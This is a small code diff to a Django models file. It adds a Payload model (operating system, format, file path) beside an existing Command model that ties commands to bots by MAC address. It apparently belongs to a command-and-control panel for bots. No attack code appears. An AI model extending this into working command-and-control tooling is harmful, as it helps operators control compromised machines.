@@ -22,3 +22,12 @@ class Command(models.Model):
 
     def __str__(self):
         return f"{self.bot.mac} -> {self.command}"
+
+class Payload(models.Model):
+    os = models.CharField(max_length=50)
+    format = models.CharField(max_length=50)
+    file_path = models.CharField(max_length=255)
+    created_at = models.DateTimeField(auto_now_add=True)
+
+    def __str__(self):
+        return f"{self.os} - {self.format} - {self.file_path}"
